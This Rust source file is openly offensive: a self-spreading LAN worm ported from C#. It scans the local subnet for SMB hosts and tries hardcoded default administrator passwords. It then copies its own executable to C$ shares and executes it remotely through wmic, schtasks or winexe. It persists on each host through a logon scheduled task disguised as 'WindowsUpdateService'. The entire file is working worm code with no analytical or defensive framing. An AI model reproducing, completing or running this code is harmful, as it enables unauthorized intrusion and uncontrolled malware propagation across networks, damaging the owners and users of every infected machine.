// lan.rs — Rust port of lan.cs (LANWorm)
// LAN worm that scans the local subnet, attempts SMB authentication with
// default credentials, copies itself to remote hosts, and executes remotely.

use std::collections::HashSet;
use std::net::{IpAddr, Ipv4Addr, SocketAddr, UdpSocket};
use std::sync::{Mutex, atomic::{AtomicBool, Ordering}};
use std::time::Duration;
use tokio::sync::Semaphore;
use std::sync::Arc;
use log::{info, warn};

// Default credentials to try (ordered by likelihood)
const CREDENTIALS: &[(&str, &str)] = &[
    ("Administrator", ""),
    ("Administrator", "admin"),
    ("Administrator", "password"),
    ("Administrator", "Password123"),
    ("Admin", "admin"),
    ("admin", "admin"),
    ("admin", "123456"),
];

lazy_static::lazy_static! {
    static ref IS_SPREADING: AtomicBool = AtomicBool::new(false);
    static ref COMPROMISED: Mutex<HashSet<String>> = Mutex::new(HashSet::new());
}

/// Maximum concurrent host-attack tasks.
const MAX_CONCURRENCY: usize = 10;

/// Timeout for TCP port probes (ms).
const PORT_PROBE_TIMEOUT_MS: u64 = 1500;

/// Seconds between full subnet sweeps.
const SWEEP_INTERVAL_SECS: u64 = 10;

pub struct LANWorm;

impl LANWorm {
    /// Starts the worm spreading loop in a background tokio task.
    pub fn start_spreading() {
        if IS_SPREADING.load(Ordering::SeqCst) {
            info!("Worm already spreading.");
            return;
        }
        IS_SPREADING.store(true, Ordering::SeqCst);

        let self_path = std::env::current_exe()
            .ok()
            .and_then(|p| p.canonicalize().ok())
            .map(|p| p.to_string_lossy().to_string());

        let subnet = match detect_local_subnet() {
            Some(s) => s,
            None => {
                warn!("[-] Could not detect local subnet.");
                IS_SPREADING.store(false, Ordering::SeqCst);
                return;
            }
        };

        info!("[*] Worm started on {}/24", subnet);

        tokio::spawn(async move {
            spread_loop(subnet, self_path).await;
        });
    }

    /// Stops the spreading loop. Active per-host tasks will finish but no
    /// new sweep will start.
    pub fn stop_spreading() {
        IS_SPREADING.store(false, Ordering::SeqCst);
        info!("Worm spreading stopped.");
    }

    /// Returns the number of compromised hosts.
    pub fn get_compromised_count() -> usize {
        COMPROMISED.lock().unwrap().len()
    }

    /// Returns the list of compromised host IPs.
    pub fn get_compromised_hosts() -> Vec<String> {
        COMPROMISED.lock().unwrap().iter().cloned().collect()
    }
}

// ==================== Core Spread Logic ====================

/// Continuously sweeps the /24 subnet until `IS_SPREADING` is cleared.
async fn spread_loop(subnet: Ipv4Addr, self_path: Option<String>) {
    let semaphore = Arc::new(Semaphore::new(MAX_CONCURRENCY));
    let prefix = subnet_prefix(subnet);

    while IS_SPREADING.load(Ordering::SeqCst) {
        let mut tasks = Vec::with_capacity(254);

        for i in 1u8..=254 {
            if !IS_SPREADING.load(Ordering::SeqCst) {
                break;
            }

            let ip = Ipv4Addr::new(prefix[0], prefix[1], prefix[2], i);
            let ip_str = ip.to_string();

            // Skip already-compromised hosts
            {
                let compromised = COMPROMISED.lock().unwrap();
                if compromised.contains(&ip_str) {
                    continue;
                }
            }

            // Skip our own address
            if ip == subnet {
                continue;
            }

            let sem = semaphore.clone();
            let self_path_owned = self_path.clone();

            tasks.push(tokio::spawn(async move {
                let _permit = sem.acquire().await.unwrap();
                attack_host(&ip_str, self_path_owned.as_deref()).await;
            }));
        }

        // Wait for all tasks in this sweep to finish
        for task in tasks {
            let _ = task.await;
        }

        if IS_SPREADING.load(Ordering::SeqCst) {
            tokio::time::sleep(Duration::from_secs(SWEEP_INTERVAL_SECS)).await;
        }
    }

    info!("Spread loop exited.");
}

/// Attacks a single host: probe → authenticate → copy → execute → persist.
async fn attack_host(ip: &str, self_path: Option<&str>) {
    // Phase 1: Check if host is alive (SMB port 445)
    if !is_port_open(ip, 445).await {
        return;
    }
    info!("[+] Host alive (port 445 open): {}", ip);

    // Phase 2: Try credentials via SMB IPC$ share
    let mut valid_creds: Option<(&str, &str)> = None;
    for &(user, pass) in CREDENTIALS {
        match try_smb_connect(ip, user, pass).await {
            Ok(true) => {
                info!("[+] SMB auth success: {} ({}:{})", ip, user, pass);
                valid_creds = Some((user, pass));
                break;
            }
            Ok(false) => { /* bad creds, try next */ }
            Err(e) => {
                warn!("[-] SMB connect error on {}: {}", ip, e);
                break; // likely a connection issue, skip host
            }
        }
    }

    let (user, pass) = match valid_creds {
        Some(c) => c,
        None => {
            info!("[-] No valid credentials for {}", ip);
            return;
        }
    };

    // Phase 3: Copy self to remote host via SMB C$ share
    let source_path = match self_path {
        Some(p) => p,
        None => {
            warn!("[-] No self-path available for copy to {}", ip);
            return;
        }
    };

    let file_name = match std::path::Path::new(source_path).file_name() {
        Some(n) => n.to_string_lossy().to_string(),
        None => {
            warn!("[-] Could not determine filename from path: {}", source_path);
            return;
        }
    };

    if let Err(e) = copy_to_remote(ip, user, pass, source_path, &file_name).await {
        warn!("[-] Failed to copy to {}: {}", ip, e);
        // Clean up the SMB session
        let _ = disconnect_smb_share(ip, "C$").await;
        return;
    }
    info!("[+] Copied payload to {}", ip);

    // Phase 4: Execute remotely — try WMI first, fall back to schtasks
    let remote_path = format!(r"C:\Windows\Temp\{}", file_name);
    let executed = match execute_remote_wmi(ip, user, pass, &remote_path).await {
        Ok(true) => {
            info!("[+] Remote execution via WMI on {}", ip);
            true
        }
        _ => {
            info!("[*] WMI failed on {}, trying schtasks fallback", ip);
            match execute_remote_schtasks(ip, user, pass, &remote_path).await {
                Ok(true) => {
                    info!("[+] Remote execution via schtasks on {}", ip);
                    true
                }
                Ok(false) => {
                    warn!("[-] schtasks execution failed on {}", ip);
                    false
                }
                Err(e) => {
                    warn!("[-] schtasks error on {}: {}", ip, e);
                    false
                }
            }
        }
    };

    if executed {
        COMPROMISED.lock().unwrap().insert(ip.to_string());
        info!("[+] Successfully spread to {}", ip);

        // Phase 5: Persist via scheduled task
        if let Err(e) = persist_remote(ip, user, pass, &remote_path).await {
            warn!("[-] Persistence on {} failed: {}", ip, e);
        } else {
            info!("[+] Persistence established on {}", ip);
        }
    }
}

// ==================== Network Helpers ====================

/// Detects the local IPv4 address by opening a UDP socket toward a public
/// address (8.8.8.8). No packet is actually sent — the OS simply selects
/// the source address that would be used to reach that destination.
///
/// This works on both Windows and Linux and handles multi-homed hosts
/// (multiple NICs) by returning the address chosen by the routing table.
fn detect_local_subnet() -> Option<Ipv4Addr> {
    // Try multiple well-known IPs in case one is blocked by firewall rules.
    let probe_targets = ["8.8.8.8:65530", "1.1.1.1:65530", "208.67.222.222:65530"];

    for target in &probe_targets {
        if let Ok(socket) = UdpSocket::bind("0.0.0.0:0") {
            if socket.connect(target).is_ok() {
                if let Ok(local_addr) = socket.local_addr() {
                    if let IpAddr::V4(ipv4) = local_addr.ip() {
                        // Reject loopback and link-local
                        if !ipv4.is_loopback() && !ipv4.is_link_local() {
                            return Some(ipv4);
                        }
                    }
                }
            }
        }
    }

    // Fallback: parse network interface addresses directly
    #[cfg(target_os = "windows")]
    {
        if let Some(ip) = detect_subnet_from_ipconfig() {
            return Some(ip);
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        if let Some(ip) = detect_subnet_from_ip_command() {
            return Some(ip);
        }
    }

    None
}

/// Returns the first three octets of an IPv4 address as an array.
fn subnet_prefix(ip: Ipv4Addr) -> [u8; 4] {
    ip.octets()
}

/// Fallback subnet detection on Windows via `ipconfig`.
#[cfg(target_os = "windows")]
fn detect_subnet_from_ipconfig() -> Option<Ipv4Addr> {
    let output = std::process::Command::new("ipconfig")
        .output()
        .ok()?;
    let text = String::from_utf8_lossy(&output.stdout);

    for line in text.lines() {
        let trimmed = line.trim();
        // Look for lines like "IPv4 Address. . . . . . . . . . . : 192.168.1.50"
        if trimmed.contains("IPv4") && trimmed.contains(':') {
            if let Some(addr_str) = trimmed.split(':').nth(1) {
                if let Ok(ip) = addr_str.trim().parse::<Ipv4Addr>() {
                    if !ip.is_loopback() && !ip.is_link_local() {
                        return Some(ip);
                    }
                }
            }
        }
    }
    None
}

/// Fallback subnet detection on Linux via `ip -4 addr`.
#[cfg(not(target_os = "windows"))]
fn detect_subnet_from_ip_command() -> Option<Ipv4Addr> {
    let output = std::process::Command::new("ip")
        .args(&["-4", "-o", "addr", "show", "scope", "global"])
        .output()
        .ok()?;
    let text = String::from_utf8_lossy(&output.stdout);

    // Format: "2: eth0    inet 192.168.1.50/24 brd ..."
    for line in text.lines() {
        if let Some(inet_pos) = line.find("inet ") {
            let after_inet = &line[inet_pos + 5..];
            if let Some(slash_pos) = after_inet.find('/') {
                if let Ok(ip) = after_inet[..slash_pos].trim().parse::<Ipv4Addr>() {
                    if !ip.is_loopback() {
                        return Some(ip);
                    }
                }
            }
        }
    }
    None
}

/// Probes a TCP port on the given host with a timeout.
async fn is_port_open(ip: &str, port: u16) -> bool {
    let addr_str = format!("{}:{}", ip, port);
    let addr: SocketAddr = match addr_str.parse() {
        Ok(a) => a,
        Err(_) => return false,
    };

    tokio::time::timeout(
        Duration::from_millis(PORT_PROBE_TIMEOUT_MS),
        tokio::net::TcpStream::connect(addr),
    )
    .await
    .map(|r| r.is_ok())
    .unwrap_or(false)
}

// ==================== SMB Operations ====================
//
// Rust has no built-in SMB/CIFS stack. On Windows we shell out to `net use`
// (the same approach the original C# code used). On Linux we try `smbclient`.

/// Attempts to authenticate to the IPC$ share of the target host.
/// Returns Ok(true) on success, Ok(false) on auth failure, Err on I/O error.
async fn try_smb_connect(ip: &str, user: &str, pass: &str) -> Result<bool, String> {
    #[cfg(target_os = "windows")]
    {
        // First, ensure no stale connection exists
        let _ = tokio::process::Command::new("net")
            .args(&["use", &format!(r"\\{}\IPC$", ip), "/delete", "/y"])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .output()
            .await;

        // Attempt authentication
        let connect_result = tokio::time::timeout(
            Duration::from_secs(10),
            tokio::process::Command::new("net")
                .args(&[
                    "use",
                    &format!(r"\\{}\IPC$", ip),
                    &format!("/user:{}", user),
                    pass,
                ])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::piped())
                .output(),
        )
        .await;

        match connect_result {
            Ok(Ok(output)) => {
                let success = output.status.success();
                // Always clean up the session
                let _ = disconnect_smb_share(ip, "IPC$").await;
                Ok(success)
            }
            Ok(Err(e)) => Err(format!("Failed to run 'net use': {}", e)),
            Err(_) => Err(format!("SMB connect to {} timed out", ip)),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        // Try smbclient on Linux
        let auth_arg = if pass.is_empty() {
            "-N".to_string() // no password
        } else {
            pass.to_string()
        };

        let result = tokio::time::timeout(
            Duration::from_secs(10),
            tokio::process::Command::new("smbclient")
                .args(&[
                    &format!("//{}/IPC$", ip),
                    "-U", &format!("{}%{}", user, auth_arg),
                    "-c", "exit",
                ])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .output(),
        )
        .await;

        match result {
            Ok(Ok(output)) => Ok(output.status.success()),
            Ok(Err(e)) => Err(format!("smbclient failed: {}", e)),
            Err(_) => Err(format!("SMB connect to {} timed out", ip)),
        }
    }
}

/// Disconnects an SMB share.
async fn disconnect_smb_share(ip: &str, share: &str) -> bool {
    #[cfg(target_os = "windows")]
    {
        tokio::process::Command::new("net")
            .args(&["use", &format!(r"\\{}\{}", ip, share), "/delete", "/y"])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .output()
            .await
            .map(|o| o.status.success())
            .unwrap_or(false)
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (ip, share);
        true // nothing to disconnect
    }
}

/// Copies a local file to the remote host's C$ admin share.
async fn copy_to_remote(
    ip: &str,
    user: &str,
    pass: &str,
    source_path: &str,
    file_name: &str,
) -> Result<(), String> {
    #[cfg(target_os = "windows")]
    {
        // Mount the C$ share
        let mount_result = tokio::time::timeout(
            Duration::from_secs(15),
            tokio::process::Command::new("net")
                .args(&[
                    "use",
                    &format!(r"\\{}\C$", ip),
                    &format!("/user:{}", user),
                    pass,
                ])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::piped())
                .output(),
        )
        .await;

        match mount_result {
            Ok(Ok(output)) if output.status.success() => { /* connected */ }
            Ok(Ok(output)) => {
                let stderr = String::from_utf8_lossy(&output.stderr);
                return Err(format!("net use C$ failed: {}", stderr.trim()));
            }
            Ok(Err(e)) => return Err(format!("Failed to run 'net use': {}", e)),
            Err(_) => return Err("SMB C$ mount timed out".to_string()),
        }

        // Use `copy` command for reliability (handles UNC paths natively)
        let remote_unc = format!(r"\\{}\C$\Windows\Temp\{}", ip, file_name);
        let copy_result = tokio::process::Command::new("cmd.exe")
            .args(&["/c", "copy", "/y", source_path, &remote_unc])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::piped())
            .output()
            .await;

        // Always disconnect the share
        let _ = disconnect_smb_share(ip, "C$").await;

        match copy_result {
            Ok(output) if output.status.success() => Ok(()),
            Ok(output) => {
                let stderr = String::from_utf8_lossy(&output.stderr);
                Err(format!("File copy failed: {}", stderr.trim()))
            }
            Err(e) => Err(format!("copy command failed: {}", e)),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        // Use smbclient to upload the file
        let put_cmd = format!("put \"{}\" \"Windows\\Temp\\{}\"", source_path, file_name);
        let result = tokio::time::timeout(
            Duration::from_secs(30),
            tokio::process::Command::new("smbclient")
                .args(&[
                    &format!("//{}/C$", ip),
                    "-U", &format!("{}%{}", user, pass),
                    "-c", &put_cmd,
                ])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::piped())
                .output(),
        )
        .await;

        match result {
            Ok(Ok(output)) if output.status.success() => Ok(()),
            Ok(Ok(output)) => {
                let stderr = String::from_utf8_lossy(&output.stderr);
                Err(format!("smbclient put failed: {}", stderr.trim()))
            }
            Ok(Err(e)) => Err(format!("smbclient error: {}", e)),
            Err(_) => Err("smbclient upload timed out".to_string()),
        }
    }
}

// ==================== Remote Execution ====================

/// Executes a command on the remote host using WMI (wmic process call create).
/// wmic is deprecated in modern Windows but still functional on many systems.
/// Returns Ok(true) if the process was created successfully.
async fn execute_remote_wmi(
    ip: &str,
    user: &str,
    pass: &str,
    remote_path: &str,
) -> Result<bool, String> {
    #[cfg(target_os = "windows")]
    {
        let result = tokio::time::timeout(
            Duration::from_secs(15),
            tokio::process::Command::new("wmic")
                .args(&[
                    &format!("/node:{}", ip),
                    &format!("/user:{}", user),
                    &format!("/password:{}", pass),
                    "process",
                    "call",
                    "create",
                    &format!("\"{}\"", remote_path),
                ])
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .output(),
        )
        .await;

        match result {
            Ok(Ok(output)) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                // wmic reports "ReturnValue = 0" on successful process creation
                if stdout.contains("ReturnValue = 0") {
                    Ok(true)
                } else {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    warn!("wmic output: {} | stderr: {}", stdout.trim(), stderr.trim());
                    Ok(false)
                }
            }
            Ok(Err(e)) => Err(format!("wmic failed: {}", e)),
            Err(_) => Err("wmic timed out".to_string()),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        // On Linux, try winexe or impacket's wmiexec.py
        let result = tokio::time::timeout(
            Duration::from_secs(15),
            tokio::process::Command::new("winexe")
                .args(&[
                    &format!("--user={}%{}", user, pass),
                    &format!("//{}", ip),
                    remote_path,
                ])
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .output(),
        )
        .await;

        match result {
            Ok(Ok(output)) => Ok(output.status.success()),
            Ok(Err(_)) => Err("winexe not available".to_string()),
            Err(_) => Err("winexe timed out".to_string()),
        }
    }
}

/// Fallback remote execution via `schtasks` — works on modern Windows where
/// wmic may be removed or disabled.
async fn execute_remote_schtasks(
    ip: &str,
    user: &str,
    pass: &str,
    remote_path: &str,
) -> Result<bool, String> {
    let task_name = "WinTempExec";

    #[cfg(target_os = "windows")]
    {
        // Create a one-time scheduled task on the remote host
        let create = tokio::time::timeout(
            Duration::from_secs(15),
            tokio::process::Command::new("schtasks")
                .args(&[
                    "/create",
                    "/s", ip,
                    "/u", user,
                    "/p", pass,
                    "/tn", task_name,
                    "/tr", remote_path,
                    "/sc", "once",
                    "/st", "00:00",
                    "/rl", "highest",
                    "/f",
                ])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::piped())
                .output(),
        )
        .await;

        let created = match create {
            Ok(Ok(output)) => output.status.success(),
            Ok(Err(e)) => return Err(format!("schtasks /create failed: {}", e)),
            Err(_) => return Err("schtasks /create timed out".to_string()),
        };

        if !created {
            return Ok(false);
        }

        // Run the task immediately
        let run = tokio::time::timeout(
            Duration::from_secs(10),
            tokio::process::Command::new("schtasks")
                .args(&[
                    "/run",
                    "/s", ip,
                    "/u", user,
                    "/p", pass,
                    "/tn", task_name,
                ])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .output(),
        )
        .await;

        let ran = match run {
            Ok(Ok(output)) => output.status.success(),
            _ => false,
        };

        // Clean up the one-shot task
        let _ = tokio::process::Command::new("schtasks")
            .args(&[
                "/delete",
                "/s", ip,
                "/u", user,
                "/p", pass,
                "/tn", task_name,
                "/f",
            ])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .output()
            .await;

        Ok(ran)
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (ip, user, pass, remote_path, task_name);
        Err("schtasks requires Windows".to_string())
    }
}

// ==================== Persistence ====================

/// Creates a persistent scheduled task on the remote host that runs the
/// payload on every logon.
async fn persist_remote(
    ip: &str,
    user: &str,
    pass: &str,
    remote_path: &str,
) -> Result<(), String> {
    let task_name = "WindowsUpdateService";

    #[cfg(target_os = "windows")]
    {
        let result = tokio::time::timeout(
            Duration::from_secs(15),
            tokio::process::Command::new("schtasks")
                .args(&[
                    "/create",
                    "/s", ip,
                    "/u", user,
                    "/p", pass,
                    "/tn", task_name,
                    "/tr", remote_path,
                    "/sc", "onlogon",
                    "/rl", "highest",
                    "/f", // force-overwrite if exists
                ])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::piped())
                .output(),
        )
        .await;

        match result {
            Ok(Ok(output)) if output.status.success() => Ok(()),
            Ok(Ok(output)) => {
                let stderr = String::from_utf8_lossy(&output.stderr);
                Err(format!("schtasks /create failed: {}", stderr.trim()))
            }
            Ok(Err(e)) => Err(format!("schtasks error: {}", e)),
            Err(_) => Err("schtasks timed out".to_string()),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (ip, user, pass, remote_path, task_name);
        Err("Remote persistence requires Windows".to_string())
    }
}
